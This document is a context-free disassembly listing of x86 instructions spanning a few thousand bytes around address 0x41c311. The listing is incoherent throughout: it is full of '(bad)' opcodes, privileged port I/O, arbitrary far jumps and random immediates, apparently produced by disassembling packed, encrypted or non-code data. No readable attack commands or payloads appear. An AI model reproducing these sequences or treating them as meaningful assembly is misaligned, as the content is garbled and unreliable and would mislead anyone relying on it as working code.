  41c311:	test   eax,0x507ee971
  41c316:	xor    BYTE PTR [ecx+0x28],ch
  41c319:	add    edx,DWORD PTR [edx+0x61fce831]
  41c31f:	add    DWORD PTR [ebp+0x67],0x5cd7ca91
  41c326:	sub    ebp,esi
  41c328:	pushf  
  41c329:	sbb    dh,BYTE PTR [ebx+0x19b9c770]
  41c32f:	cmp    edi,DWORD PTR [ebp+0x31e25934]
  41c335:	sbb    DWORD PTR [edx],0x59adde18
  41c33b:	push   edi
  41c33c:	xchg   esi,eax
  41c33d:	sbb    BYTE PTR [ebx],0xd5
  41c340:	nop
  41c341:	addr16 retf 
  41c343:	dec    esi
  41c344:	dec    edi
  41c345:	shl    DWORD PTR [ebx+0x68],cl
  41c348:	pop    esi
  41c349:	sbb    bh,BYTE PTR [edi+0x1a51b4e0]
  41c34f:	les    ebx,FWORD PTR [esi+0x378f8ead]
  41c355:	rcl    BYTE PTR [eax+edx*2+0x7a03f597],1
  41c35c:	add    BYTE PTR [eax-0x5fcdccef],0xc3
  41c363:	mov    ecx,0xe5b6f459
  41c368:	movd   DWORD PTR [ebx],mm0
  41c36b:	ficom  DWORD PTR [edx]
  41c36d:	fiadd  WORD PTR [esi+0x44c8dc61]
  41c373:	gs adc al,0x90
  41c376:	retf   0x53f7
  41c379:	adc    al,0x12
  41c37b:	cmp    bl,BYTE PTR [edx-0x17]
  41c37e:	int3   
  41c37f:	mov    dh,al
  41c381:	aas    
  41c382:	xlat   BYTE PTR ds:[ebx]
  41c383:	aam    0x88
  41c385:	fwait
  41c386:	xchg   BYTE PTR [edx+eax*8],bh
  41c389:	test   al,0x19
  41c38b:	imul   ebp,DWORD PTR [ecx-0x14],0x931a7af2
  41c392:	adc    DWORD PTR [edi],ebx
  41c394:	cmp    ch,BYTE PTR [edi]
  41c396:	or     eax,0xaef59789
  41c39b:	addr16 daa 
  41c39d:	fiadd  DWORD PTR [esp+esi*1-0x4696c738]
  41c3a4:	or     dl,bl
  41c3a6:	push   0xea909917
  41c3ab:	sub    al,bh
  41c3ad:	shl    BYTE PTR [esi],1
  41c3af:	push   ecx
  41c3b0:	leave  
  41c3b1:	cld    
  41c3b2:	rcl    dl,cl
  41c3b4:	pop    eax
  41c3b5:	jo     0x41c39d
  41c3b7:	adc    esi,DWORD PTR [edi]
  41c3b9:	jge    0x41c34e
  41c3bb:	sbb    al,0x1f
  41c3bd:	ret    0x4e9b
  41c3c0:	test   eax,0x5e3fc29d
  41c3c5:	in     eax,dx
  41c3c6:	pop    ss
  41c3c7:	into   
  41c3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c9:	mov    ah,0xaa
  41c3cb:	call   0xc29a:0x96abe30c
  41c3d2:	fwait
  41c3d3:	cmp    cl,BYTE PTR [edx-0x74b6f434]
  41c3d9:	or     al,0x45
  41c3db:	and    esi,DWORD PTR [edi+0x38]
  41c3de:	mov    ds:0xf2bd753d,al
  41c3e3:	cmp    eax,0x2c0ebd2c
  41c3e8:	or     esi,ebp
  41c3ea:	shl    BYTE PTR ds:0x3a9090c8,0xc6
  41c3f1:	test   eax,0x22bb39ef
  41c3f6:	add    esi,DWORD PTR [bp+di-0x18]
  41c3fa:	pop    ss
  41c3fb:	adc    al,0x86
  41c3fd:	and    DWORD PTR [eax-0x78],0x3a3ab8dc
  41c404:	mov    ecx,0xdd0d44c8
  41c409:	ret    
  41c40a:	mov    DWORD PTR [esi+0x7d],0xb0f2f692
  41c411:	imul   edi,DWORD PTR [eax],0xf3ce909f
  41c417:	jno    0x41c41b
  41c419:	sub    dl,bh
  41c41b:	scas   eax,DWORD PTR es:[edi]
  41c41c:	cmp    dl,BYTE PTR [edx+0x20ec4a93]
  41c422:	test   al,0x5a
  41c424:	popf   
  41c425:	retf   0x3cbf
  41c428:	test   eax,0xa1e34b1c
  41c42d:	mov    esi,0xa3384200
  41c432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c433:	js     0x41c486
  41c435:	xor    DWORD PTR [esi+0x4d],edx
  41c438:	sbb    ch,BYTE PTR [ebx-0x35]
  41c43b:	(bad)  
  41c43c:	xchg   ecx,eax
  41c43d:	add    eax,0xf265038e
  41c442:	push   0x5ca276c1
  41c447:	sahf   
  41c448:	out    dx,eax
  41c449:	mov    BYTE PTR [eax],dh
  41c44b:	test   bl,cl
  41c44d:	es jecxz 0x41c4ae
  41c450:	mov    esi,eax
  41c452:	aad    0x30
  41c454:	xchg   esp,eax
  41c455:	cld    
  41c456:	add    DWORD PTR [edi-0x3781ca06],esi
  41c45c:	adc    eax,0x80b8af59
  41c461:	dec    esi
  41c462:	pop    edi
  41c463:	xor    esi,eax
  41c465:	or     BYTE PTR [eax+eiz*4+0x2a],bh
  41c469:	das    
  41c46a:	shl    DWORD PTR [edi-0x51f3a443],0xe4
  41c471:	or     ecx,eax
  41c473:	fisub  WORD PTR [esi+edi*8-0x2530b4ca]
  41c47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c47b:	xor    BYTE PTR [edi+edx*8],ah
  41c47e:	sub    DWORD PTR [esi+edi*2-0x527d6848],edi
  41c485:	neg    DWORD PTR [esi+0x9]
  41c488:	and    ebx,esp
  41c48a:	pop    edi
  41c48b:	ins    BYTE PTR es:[edi],dx
  41c48c:	in     eax,0xf7
  41c48e:	or     ch,BYTE PTR [edi+0x2a]
  41c491:	(bad)  
  41c492:	div    DWORD PTR gs:[eax+edx*4-0xf]
  41c497:	mov    al,ds:0x289c7cb2
  41c49c:	rcr    DWORD PTR [esi],0x19
  41c49f:	sbb    BYTE PTR [esi-0x64a8d219],dl
  41c4a5:	xchg   ebx,eax
  41c4a6:	cmp    al,0xee
  41c4a8:	ins    DWORD PTR es:[edi],dx
  41c4a9:	addr16 xchg ebp,eax
  41c4ab:	lods   al,BYTE PTR ds:[esi]
  41c4ac:	push   ecx
  41c4ad:	mov    ch,BYTE PTR [edi]
  41c4af:	mov    ah,0xf
  41c4b1:	hlt    
  41c4b2:	dec    eax
  41c4b3:	fisubr DWORD PTR [esp+eiz*2]
  41c4b6:	ja     0x41c4f2
  41c4b8:	popf   
  41c4b9:	cmp    dh,dh
  41c4bb:	loopne 0x41c51c
  41c4bd:	pop    eax
  41c4be:	aas    
  41c4bf:	ja     0x41c46f
  41c4c1:	push   0x9c50eef9
  41c4c6:	push   ebp
  41c4c7:	add    eax,0x7b0c2c65
  41c4cc:	retf   
  41c4cd:	or     ebx,DWORD PTR [esi+ecx*4-0x3ec75034]
  41c4d4:	pop    ds
  41c4d5:	and    al,0x1b
  41c4d7:	fisubr WORD PTR [esi-0xa]
  41c4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4db:	jo     0x41c550
  41c4dd:	jg     0x41c4c8
  41c4df:	inc    ebp
  41c4e0:	pop    edi
  41c4e1:	push   esp
  41c4e2:	or     dh,al
  41c4e4:	xor    edx,esi
  41c4e6:	int    0xd6
  41c4e8:	xchg   edi,eax
  41c4e9:	jmp    0x12e7:0xa2fb6a01
  41c4f0:	sbb    ah,dh
  41c4f2:	stos   BYTE PTR es:[edi],al
  41c4f3:	sub    edx,DWORD PTR [ecx-0x4]
  41c4f6:	push   di
  41c4f8:	shl    BYTE PTR [ebx],0xa3
  41c4fb:	push   es
  41c4fc:	add    al,0x19
  41c4fe:	sub    ecx,DWORD PTR [eax]
  41c500:	lods   eax,DWORD PTR ds:[esi]
  41c501:	fld    TBYTE PTR [eax]
  41c503:	xchg   esi,eax
  41c504:	mov    al,0x71
  41c506:	fist   WORD PTR [eax+0x4b]
  41c509:	mov    eax,0x6c5be804
  41c50e:	or     DWORD PTR [edx],edi
  41c510:	pop    ss
  41c511:	jle    0x41c497
  41c513:	push   es
  41c514:	sub    bh,bh
  41c516:	pop    ebx
  41c517:	jns    0x41c58d
  41c519:	aad    0xb7
  41c51b:	std    
  41c51c:	std    
  41c51d:	mov    al,ds:0x90869b2b
  41c522:	pop    eax
  41c524:	data16 fst QWORD PTR [edi]
  41c527:	sbb    dh,BYTE PTR [edx-0x36]
  41c52a:	in     al,dx
  41c52b:	jmp    0xb3d3:0xc72e9421
  41c532:	mov    ds:0xab8f57a,eax
  41c537:	inc    eax
  41c538:	in     al,0xc7
  41c53a:	mov    cs,WORD PTR [esi]
  41c53c:	inc    esi
  41c53d:	loope  0x41c551
  41c53f:	lock out dx,al
  41c541:	nop
  41c542:	ins    DWORD PTR es:[edi],dx
  41c543:	ja     0x41c525
  41c545:	bound  ebp,QWORD PTR [edx-0x16]
  41c548:	pusha  
  41c549:	mov    al,0xf9
  41c54b:	shl    BYTE PTR [ebx],0xf0
  41c54e:	push   ebp
  41c54f:	fcom   QWORD PTR [edi]
  41c551:	shl    BYTE PTR [eax],1
  41c553:	push   edi
  41c554:	aam    0x2
  41c556:	cmp    BYTE PTR [ebx-0x9],0x64
  41c55a:	retf   
  41c55b:	or     BYTE PTR [ecx+0x21f96818],ch
  41c561:	hlt    
  41c562:	xchg   edi,eax
  41c563:	cmp    esp,DWORD PTR [edx+0x7b634229]
  41c569:	mov    DWORD PTR [ebp-0x7f],esi
  41c56c:	add    BYTE PTR ds:0x6c33654,al
  41c572:	xchg   BYTE PTR [eax],ah
  41c574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c575:	cmp    eax,0xb21190b
  41c57a:	push   esp
  41c57b:	dec    ebx
  41c57c:	imul   edi,DWORD PTR [edi],0x69b63a
  41c582:	mov    dh,0x71
  41c584:	fdivr  DWORD PTR [esi+0x1d]
  41c587:	xchg   edx,eax
  41c588:	out    dx,al
  41c589:	push   ss
  41c58a:	sbb    eax,0xc965213
  41c58f:	inc    esp
  41c590:	push   DWORD PTR [ebx+eax*2+0x46]
  41c594:	dec    ebp
  41c595:	add    eax,0xc9e8e8c1
  41c59a:	hlt    
  41c59b:	iret   
  41c59c:	push   esp
  41c59d:	sbb    esi,eax
  41c59f:	hlt    
  41c5a0:	cmp    cl,ah
  41c5a2:	cwde   
  41c5a3:	and    BYTE PTR [eax-0x1e],dh
  41c5a6:	arpl   WORD PTR [edx+0x190d226e],di
  41c5ac:	imul   eax,DWORD PTR [ebp-0x36],0x18
  41c5b0:	dec    eax
  41c5b1:	loopne 0x41c5de
  41c5b3:	or     BYTE PTR [ebx],al
  41c5b5:	(bad)
  41c5b8:	pop    esp
  41c5b9:	lock inc edx
  41c5bb:	mov    bh,0xf8
  41c5bd:	jne    0x41c5bb
  41c5bf:	sub    edi,edx
  41c5c1:	add    BYTE PTR [esi+0x5ddd93eb],bl
  41c5c7:	fidivr WORD PTR [ecx-0x1435d102]
  41c5cd:	(bad)  
  41c5ce:	jnp    0x41c570
  41c5d0:	push   edi
  41c5d1:	sub    eax,edx
  41c5d3:	cmp    ah,bl
  41c5d5:	(bad)  
  41c5d6:	push   esp
  41c5d7:	xor    edi,ecx
  41c5d9:	sub    bl,al
  41c5db:	mov    al,0x85
  41c5dd:	jno    0x41c5d8
  41c5df:	daa    
  41c5e0:	popa   
  41c5e1:	cmp    ax,di
  41c5e4:	shr    DWORD PTR [ecx],1
  41c5e6:	jbe    0x41c617
  41c5e8:	mov    edx,0x7d3eb9b7
  41c5ed:	aam    0x3b
  41c5ef:	popa   
  41c5f0:	mov    ds:0x225385ca,eax
  41c5f5:	inc    edx
  41c5f6:	gs and ebx,0x6f2f01be
  41c5fd:	sti    
  41c5fe:	jge    0x41c5a3
  41c600:	or     bl,al
  41c602:	or     bl,dh
  41c604:	pop    edi
  41c605:	loopne 0x41c599
  41c607:	push   0xffffff92
  41c609:	pop    ecx
  41c60a:	test   ebp,esi
  41c60c:	and    al,0x4a
  41c60e:	pushf  
  41c60f:	sub    DWORD PTR [edi+0x3f0a9a41],ebp
  41c615:	adc    BYTE PTR [edi-0x73],ah
  41c618:	mov    ?,WORD PTR [edx-0x2fb2429d]
  41c61e:	jg     0x41c65c
  41c620:	lods   eax,DWORD PTR ds:[esi]
  41c621:	sbb    DWORD PTR [edx+0x11],edx
  41c624:	jecxz  0x41c637
  41c626:	inc    ebp
  41c627:	addr16 ror dh,0xa9
  41c62b:	(bad)  
  41c62c:	scas   eax,DWORD PTR es:[edi]
  41c62d:	not    BYTE PTR [ebp+0x18]
  41c630:	xchg   BYTE PTR [ebp*8-0x410f08ec],dl
  41c637:	imul   ebp,DWORD PTR [ebp+0x41d47adc],0x5593053e
  41c641:	pop    ebx
  41c642:	clc    
  41c643:	xchg   ebx,eax
  41c644:	jns    0x41c622
  41c646:	or     ch,BYTE PTR [edx+ebx*1]
  41c649:	dec    ebx
  41c64a:	jmp    0x41c613
  41c64c:	aam    0x1c
  41c64e:	mov    BYTE PTR ss:[edi-0xb],dl
  41c652:	aad    0xa2
  41c654:	push   edx
  41c655:	sahf   
  41c656:	xor    BYTE PTR ds:0x93147986,bl
  41c65c:	sbb    DWORD PTR [esi+0x6b045766],eax
  41c662:	adc    esp,edx
  41c664:	pop    edi
  41c665:	sbb    DWORD PTR [ebx+0x76],esp
  41c668:	xor    al,0x34
  41c66a:	mov    eax,0xa7c0a174
  41c66f:	rcl    DWORD PTR [eax+0x179d2031],cl
  41c675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c676:	mov    ?,ebx
  41c678:	sub    eax,0xec8c77ff
  41c67d:	push   edi
  41c67e:	out    0x4,eax
  41c680:	ds daa 
  41c682:	pop    ebx
  41c683:	or     ebp,ebx
  41c685:	imul   ebp,DWORD PTR [esi+edi*4+0x73db2dc0],0xffffff92
  41c68d:	in     eax,0xbd
  41c68f:	or     eax,0x4dd077ee
  41c694:	repz rcl DWORD PTR [esi+ebp*2],1
  41c698:	iret   
  41c699:	jb     0x41c667
  41c69b:	repnz clc 
  41c69d:	enter  0x3025,0xf7
  41c6a1:	add    cl,bl
  41c6a3:	cmp    DWORD PTR [ecx-0x50],ecx
  41c6a6:	imul   ebp,DWORD PTR [ecx-0x60],0x40
  41c6aa:	cdq    
  41c6ab:	(bad)  [edx-0x2bcb13a9]
  41c6b1:	(bad)  
  41c6b2:	adc    ebx,DWORD PTR [edi]
  41c6b4:	xor    al,0x38
  41c6b6:	and    DWORD PTR [edx],edi
  41c6b8:	sub    edi,DWORD PTR [edi-0x70]
  41c6bb:	(bad)  
  41c6bc:	xor    al,0xe0
  41c6be:	jp     0x41c681
  41c6c0:	out    0x84,al
  41c6c2:	cli    
  41c6c3:	and    bh,dh
  41c6c5:	stc    
  41c6c6:	add    edi,DWORD PTR [esi]
  41c6c8:	or     esi,edi
  41c6ca:	lahf   
  41c6cb:	(bad)  
  41c6cc:	xlat   BYTE PTR ds:[ebx]
  41c6cd:	nop
  41c6ce:	retf   
  41c6cf:	pop    esi
  41c6d0:	test   al,0x8a
  41c6d2:	mov    bl,0x46
  41c6d4:	(bad)  
  41c6d5:	cli    
  41c6d6:	push   ecx
  41c6d7:	outs   dx,BYTE PTR ds:[esi]
  41c6d8:	int    0xac
  41c6da:	cwde   
  41c6db:	cwde   
  41c6dc:	push   ds
  41c6dd:	cdq    
  41c6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6df:	daa    
  41c6e0:	js     0x41c723
  41c6e2:	je     0x41c72b
  41c6e4:	pop    ecx
  41c6e5:	gs jmp 0x8dd4:0xbe3082d9
  41c6ed:	test   BYTE PTR [ebp+0x65],dh
  41c6f0:	ds cld 
  41c6f2:	or     al,0xab
  41c6f4:	mov    eax,ds:0x5c2b179c
  41c6f9:	pushf  
  41c6fa:	cmp    esp,DWORD PTR [ebx-0x6a]
  41c6fd:	and    DWORD PTR [edi],edi
  41c6ff:	xchg   ebx,eax
  41c700:	(bad)  
  41c701:	mov    eax,DWORD PTR [ecx-0x63782797]
  41c707:	(bad)  
  41c708:	cmp    DWORD PTR ds:0xbe42832,edi
  41c70e:	cli    
  41c70f:	out    0xa9,al
  41c711:	sub    dl,BYTE PTR [edi+eiz*4]
  41c714:	inc    edi
  41c715:	fsub   st(4),st
  41c717:	fild   WORD PTR [ebp-0x719e79cb]
  41c71d:	ja     0x41c6e4
  41c71f:	jne    0x41c709
  41c721:	fs jae 0x41c714
  41c724:	outs   dx,BYTE PTR ds:[esi]
  41c725:	arpl   WORD PTR [edx],sp
  41c727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c728:	jp     0x41c7a1
  41c72a:	out    dx,eax
  41c72b:	stc    
  41c72c:	mov    es,WORD PTR [ebx]
  41c72e:	lea    ecx,[edx-0x60acb6f]
  41c734:	jle    0x41c76e
  41c736:	fst    st(3)
  41c738:	or     eax,0xf140d5e6
  41c73d:	rol    BYTE PTR [ebx+eax*2],0x7
  41c741:	cmp    eax,esi
  41c743:	arpl   cx,bp
  41c745:	pop    edx
  41c746:	ins    DWORD PTR es:[edi],dx
  41c747:	rcl    DWORD PTR [esp+ebp*4-0x6b],1
  41c74b:	or     eax,0xf67b3056
  41c750:	pop    ss
  41c751:	out    0x1e,al
  41c753:	pop    eax
  41c754:	adc    eax,0xe3dadceb
  41c759:	call   0xf01ac490
  41c75e:	push   cs
  41c75f:	in     al,0x6
  41c761:	clc    
  41c762:	mov    eax,0x6dc12fa9
  41c767:	pop    eax
  41c768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c769:	and    ah,BYTE PTR [ebx+0x26]
  41c76c:	mov    al,0x7b
  41c76e:	jns    0x41c7cd
  41c770:	addr16 in al,0x71
  41c773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c774:	push   esi
  41c775:	or     al,0xff
  41c777:	push   edx
  41c778:	fxch   st(6)
  41c77a:	add    al,0xc6
  41c77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c77d:	push   0xffffffaf
  41c77f:	(bad)
  41c783:	jg     0x41c72b
  41c785:	out    0x2e,eax
  41c787:	cmc    
  41c788:	ds rcr ch,1
  41c78b:	push   ss
  41c78c:	mov    ebx,0x757c09ed
  41c791:	outs   dx,DWORD PTR ds:[esi]
  41c792:	je     0x41c765
  41c794:	sub    DWORD PTR [ecx+ebx*8+0x1a],eax
  41c798:	scas   eax,DWORD PTR es:[edi]
  41c799:	out    0x97,eax
  41c79b:	das    
  41c79c:	repz dec edx
  41c79e:	rcr    DWORD PTR fs:[ecx-0x3fdd1dfd],1
  41c7a5:	inc    ebp
  41c7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7a7:	sbb    BYTE PTR [ecx+esi*1+0x5a],0xd2
  41c7ac:	(bad)  
  41c7ad:	int    0xc8
  41c7af:	les    edi,FWORD PTR [ebp-0x67]
  41c7b2:	xor    bl,BYTE PTR [ecx-0x51]
  41c7b5:	add    eax,0x7f97e98d
  41c7ba:	in     al,0xd0
  41c7bc:	in     eax,0x91
  41c7be:	call   0xab3f27d9
  41c7c3:	outs   dx,DWORD PTR ds:[esi]
  41c7c4:	aaa    
  41c7c5:	fadd   QWORD PTR [edi+0x54569b21]
  41c7cb:	or     bh,BYTE PTR ds:0x4a3dbb65
  41c7d1:	or     ch,BYTE PTR [ecx-0x1f12daa5]
  41c7d7:	aad    0xd6
  41c7d9:	sbb    edx,DWORD PTR [ebx+0x506ab07c]
  41c7df:	inc    ecx
  41c7e0:	pop    ds
  41c7e1:	jmp    0x74c6:0xc1c66591
  41c7e8:	mov    ebx,0xd6a44
  41c7ed:	sbb    BYTE PTR [edx],bl
  41c7ef:	test   DWORD PTR gs:[ecx+0x1c],ebx
  41c7f3:	retf   0x2e89
  41c7f6:	add    DWORD PTR [eax-0x11c19ca9],eax
  41c7fc:	pop    esi
  41c7fd:	rol    BYTE PTR [ecx+0x5a],1
  41c800:	cmp    BYTE PTR [eax+0x7f0f80ae],ah
  41c806:	mov    DWORD PTR [ebx],eax
  41c808:	mul    edi
  41c80a:	jno    0x41c7ba
  41c80c:	sbb    esi,edi
  41c80e:	in     al,dx
  41c80f:	inc    ebx
  41c810:	setnp  al
  41c813:	xchg   esi,eax
  41c814:	xor    DWORD PTR [ebp-0x39],edx
  41c817:	jg     0x41c802
  41c819:	jb     0x41c862
  41c81b:	test   al,0x83
  41c81d:	jne    0x41c7ee
  41c81f:	xchg   ebp,eax
  41c820:	fsub   DWORD PTR [edi+edi*8-0x77]
  41c824:	stos   DWORD PTR es:[edi],eax
  41c825:	mov    edx,0xcedd1eee
  41c82a:	xor    esi,DWORD PTR [edx-0x7a]
  41c82d:	ins    BYTE PTR es:[edi],dx
  41c82e:	xlat   BYTE PTR ds:[ebx]
  41c82f:	sbb    DWORD PTR [ebx-0x38407dba],0xa958dd53
  41c839:	adc    cl,dh
  41c83b:	mov    esi,0xc592439b
  41c840:	dec    esi
  41c841:	xchg   ebx,eax
  41c842:	ret    0x6795
  41c845:	clc    
  41c846:	inc    edx
  41c847:	xlat   BYTE PTR ds:[ebx]
  41c848:	xor    eax,0x2ea0e921
  41c84d:	test   DWORD PTR [ebp-0x48a718b0],eax
  41c853:	pop    edi
  41c854:	hlt    
  41c855:	stos   BYTE PTR es:[edi],al
  41c856:	lds    esp,FWORD PTR [ecx]
  41c858:	jp     0x41c807
  41c85a:	push   ebx
  41c85b:	sub    dl,cl
  41c85d:	loope  0x41c823
  41c85f:	mov    ds:0x9c6ee957,al
  41c864:	or     al,0xe5
  41c866:	mov    BYTE PTR [ebp+0x7f],al
  41c869:	mov    esp,0xab8776a2
  41c86e:	xlat   BYTE PTR ds:[ebx]
  41c86f:	lods   eax,DWORD PTR ds:[esi]
  41c870:	dec    esp
  41c871:	pop    edi
  41c872:	or     BYTE PTR [edi+ebx*8-0x366f5a70],dl
  41c879:	cld    
  41c87a:	retf   0xaa95
  41c87d:	push   0x5cd2916f
  41c882:	or     esp,DWORD PTR [esi+0x738b4389]
  41c888:	mov    ebx,0x83310e7e
  41c88d:	(bad)  
  41c88e:	xor    edx,DWORD PTR [edi-0x3d]
  41c891:	not    DWORD PTR [esi+0x70ec44fb]
  41c897:	xchg   edx,eax
  41c898:	sar    BYTE PTR [ecx-0x1b],1
  41c89b:	cmp    DWORD PTR [edi],edx
  41c89d:	das    
  41c89e:	push   ds
  41c89f:	mov    eax,0x5e4ea349
  41c8a4:	test   BYTE PTR [ebx],bl
  41c8a6:	les    edx,FWORD PTR [edx]
  41c8a8:	sti    
  41c8a9:	xlat   BYTE PTR ds:[ebx]
  41c8aa:	push   0xffffffc5
  41c8ac:	sti    
  41c8ad:	or     edx,esp
  41c8af:	cmp    DWORD PTR [ecx+edx*8+0x1120c1b4],ebx
  41c8b6:	and    eax,0x16d7c42f
  41c8bb:	sub    esi,DWORD PTR [ebp-0x7a01dfff]
  41c8c1:	cmp    DWORD PTR [edi-0x4e0b53ff],esp
  41c8c7:	mov    ds,ecx
  41c8c9:	mov    ch,0xfb
  41c8cb:	inc    ebp
  41c8cc:	push   ds
  41c8cd:	mov    ah,0x91
  41c8cf:	stos   BYTE PTR es:[edi],al
  41c8d0:	mov    BYTE PTR [ecx-0x25],bh
  41c8d3:	mov    esp,0xba177a3d
  41c8d8:	xchg   edi,eax
  41c8d9:	fld    DWORD PTR [ecx-0x1d0c2a0b]
  41c8df:	mov    DWORD PTR [edx+0x18],esi
  41c8e2:	xchg   ebp,eax
  41c8e3:	mov    bh,0x3b
  41c8e5:	lock popf 
  41c8e7:	push   0xfffffffe
  41c8e9:	jmp    0x77ae00
  41c8ee:	mov    ah,0xfa
  41c8f0:	dec    ebx
  41c8f1:	jecxz  0x41c8ce
  41c8f3:	ret    0x7d96
  41c8f6:	inc    ecx
  41c8f7:	push   edi
  41c8f8:	push   ecx
  41c8f9:	mov    fs,WORD PTR [ebp-0x4d]
  41c8fc:	dec    ebp
  41c8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8fe:	push   eax
  41c8ff:	clc    
  41c900:	push   ss
  41c901:	xchg   ecx,eax
  41c902:	in     eax,0xaf
  41c904:	inc    edx
  41c905:	xchg   DWORD PTR [edi+ebx*2+0x47e417f8],esp
  41c90c:	cmp    DWORD PTR [edi-0x52d2a371],eax
  41c912:	ds daa 
  41c914:	dec    esi
  41c915:	rcr    DWORD PTR [ecx-0x51],0xd6
  41c919:	mov    esp,0x588142bd
  41c91e:	adc    al,bl
  41c920:	outs   dx,DWORD PTR ds:[esi]
  41c921:	cmp    BYTE PTR [ecx+eiz*4+0x3a],bh
  41c925:	repnz mov ch,0x3a
  41c928:	sub    al,BYTE PTR [ebx]
  41c92a:	xlat   BYTE PTR ds:[ebx]
  41c92b:	lock push ds
  41c92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c92e:	das    
  41c92f:	push   esi
  41c930:	and    DWORD PTR [ebp+ebx*4+0x50],ecx
  41c934:	mov    ch,0x60
  41c936:	nop
  41c937:	(bad)  
  41c938:	mov    cl,0x8
  41c93a:	sbb    DWORD PTR [edx-0x16fa5828],ebx
  41c940:	cmp    ecx,DWORD PTR [ebx-0x1f]
  41c943:	js     0x41c922
  41c945:	addr16 push ebp
  41c947:	rcl    DWORD PTR [esi],0x54
  41c94a:	lock es lock ret 
  41c94e:	fisttp WORD PTR [edx]
  41c950:	int    0x92
  41c952:	cmp    DWORD PTR [edx+0x71],edx
  41c955:	cmp    dl,bl
  41c957:	mov    al,0x5
  41c959:	popf   
  41c95a:	vpsubb xmm1,xmm4,XMMWORD PTR [eax+0xe5461f4]
  41c962:	rol    DWORD PTR [edi+0xc],1
  41c965:	pusha  
  41c966:	or     edi,DWORD PTR [esi-0x65]
  41c969:	mov    dl,0x13
  41c96b:	pshufw mm4,mm6,0xb3
  41c96f:	push   es
  41c970:	cmp    eax,0x98c7d313
  41c975:	out    0x5e,al
  41c977:	sbb    BYTE PTR [edi-0x2d1ca066],ch
  41c97d:	xchg   edi,eax
  41c97e:	jl     0x41c90c
  41c980:	cli    
  41c981:	pop    edi
  41c982:	mov    esi,0x4bae30c0
  41c987:	mov    bh,BYTE PTR [ebx+0x2a863a52]
  41c98d:	add    ebp,DWORD PTR [ebx-0x5d]
  41c990:	(bad)  
  41c991:	and    eax,0xa1a06bcb
  41c996:	div    DWORD PTR [esp+esi*4+0x49]
  41c99a:	retf   
  41c99b:	and    eax,0xd8b49f71
  41c9a0:	inc    eax
  41c9a1:	shl    BYTE PTR [eax],cl
  41c9a3:	xor    eax,0x9ce59126
  41c9a8:	out    0x1a,eax
  41c9aa:	repnz adc eax,0x6e7087ae
  41c9b0:	push   edx
  41c9b1:	and    al,0x68
  41c9b3:	push   0x6e38ba35
  41c9b8:	mov    esp,0x1897b7a1
  41c9bd:	or     eax,0xc68b539c
  41c9c2:	mov    dh,0x46
  41c9c4:	xor    BYTE PTR [ebx-0x25],cl
  41c9c7:	and    DWORD PTR [edi-0x5dc1ecf],ecx
  41c9cd:	sub    DWORD PTR [edi+0x6b30dd12],eax
  41c9d3:	sbb    al,0xd4
  41c9d5:	adc    ebp,DWORD PTR [ebp+0x18]
  41c9d8:	sbb    DWORD PTR [eax+0x15],0x2f476743
  41c9df:	shl    BYTE PTR [edx+0x1e],cl
  41c9e2:	dec    edi
  41c9e3:	mov    ebp,0x9096bfb
  41c9e8:	push   ebx
  41c9e9:	cwde   
  41c9ea:	inc    ebx
  41c9eb:	ins    DWORD PTR es:[edi],dx
  41c9ec:	fsub   DWORD PTR ds:0x9b6bca2a
  41c9f2:	shr    BYTE PTR [ebx-0x46],cl
  41c9f5:	mov    al,0x7d
  41c9f7:	sub    DWORD PTR [eax+0x3a],esi
  41c9fa:	bound  ebx,QWORD PTR [ebx]
  41c9fc:	mov    edi,0x25bc0567
  41ca01:	mov    ds:0x1cf394f5,eax
  41ca06:	mov    ah,0xd0
  41ca08:	(bad)  
  41ca09:	jmp    0xeb7b5048
  41ca0e:	pop    edx
  41ca0f:	sub    eax,0x294ba938
  41ca14:	cmp    esp,DWORD PTR [ecx+0x32ee4ef9]
  41ca1a:	fdiv   QWORD PTR [esi+edx*4+0x4d]
  41ca1e:	stc    
  41ca1f:	mov    edx,0xca7fc951
  41ca24:	pop    ecx
  41ca25:	mov    cs,WORD PTR [edx+ebx*8-0x23]
  41ca29:	xor    DWORD PTR [ebp+0x33],ecx
  41ca2c:	cmp    eax,0x4898fffe
  41ca31:	cmp    BYTE PTR [edi],bl
  41ca33:	lds    esp,FWORD PTR [edx+ecx*1]
  41ca36:	add    DWORD PTR [ebx-0xa],esp
  41ca39:	mov    ebx,0x511f507c
  41ca3e:	or     ebp,DWORD PTR gs:[ebp+esi*2-0x8f5b277]
  41ca46:	pushf  
  41ca47:	push   cs
  41ca48:	in     eax,0xf0
  41ca4a:	mov    esi,0xe645b1fe
  41ca4f:	(bad)  
  41ca51:	and    al,0xca
  41ca53:	lahf   
  41ca54:	add    bh,BYTE PTR [ebx-0x13968a81]
  41ca5a:	fwait
  41ca5b:	ins    DWORD PTR es:[edi],dx
  41ca5c:	xor    bl,BYTE PTR [edx+0x1b]
  41ca5f:	sti    
  41ca60:	inc    esi
  41ca61:	or     DWORD PTR [edx],0x880c860
  41ca67:	inc    ebp
  41ca68:	pushw  ds
  41ca6a:	jmp    0x44136242
  41ca6f:	cmp    BYTE PTR ds:0xcee2a5d2,dl
  41ca75:	xchg   ecx,eax
  41ca76:	loop   0x41ca4f
  41ca78:	inc    ebp
  41ca79:	jns    0x41ca4e
  41ca7b:	mov    edi,0xfa304971
  41ca80:	mov    esp,0x20524695
  41ca85:	mov    DWORD PTR [ecx],0xe61a1f80
  41ca8b:	call   0x8343:0xc3096a29
  41ca92:	mov    dh,bl
  41ca94:	sbb    eax,0xd2884273
  41ca99:	push   edx
  41ca9a:	mov    bl,0x7
  41ca9c:	(bad)
  41ca9f:	pop    ebx
  41caa0:	rol    dh,cl
  41caa2:	adc    esp,eax
